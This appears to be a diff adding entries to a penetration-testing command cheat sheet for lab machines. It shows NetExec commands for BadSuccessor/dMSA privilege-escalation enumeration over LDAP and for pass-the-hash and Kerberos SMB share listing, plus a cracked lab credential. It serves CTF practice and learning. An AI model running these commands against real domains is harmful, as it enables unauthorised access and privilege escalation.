@@ -91,3 +91,24 @@ Used on: **Ra**
 
 Verified WinRM access for `buse` after cracking the NTLMv2 hash. Confirmed
 `[+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)` before launching `evil-winrm`.
+
+### BadSuccessor LDAP module
+
+<!-- cmd: linux -->
+```bash
+nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
+```
+
+Used on: **Checkpoint**
+
+Enumerated principals and OUs that could participate in the BadSuccessor/dMSA chain.
+
+### Kerberos SMB share enumeration
+
+<!-- cmd: linux -->
+```bash
+nxc smb dc01.checkpoint.htb -k --use-kcache --shares
+nxc smb dc01.checkpoint.htb -u svc_deploy -H <NTLM_HASH> --shares
+```
+
+Used on: **Checkpoint**
